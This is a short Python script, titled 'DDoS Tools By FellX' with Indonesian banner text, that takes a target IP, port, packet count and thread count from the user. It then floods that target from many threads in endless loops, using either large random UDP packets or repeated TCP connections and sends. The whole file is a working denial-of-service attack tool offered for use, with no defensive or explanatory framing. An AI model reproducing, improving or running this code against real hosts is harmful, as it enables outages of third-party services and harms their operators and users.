import random
import socket
import threading
import os

os.system("clear")
print("DDoS Tools By FellX")
print("Yok Bisa Lah")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Gas?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(11240)
  i = random.choice(("[Fell]","[Wibu]","[Waifu]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Send Pakect Dari FellX!!!|")
    except:
      print("[!] | Send Pakect Dari FellX!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[Fell]","[Wibu]","[Waifu]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" FellX Di Sini!!!")
    except:
      s.close()
      print("[*] Down Ngentot Mampus")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()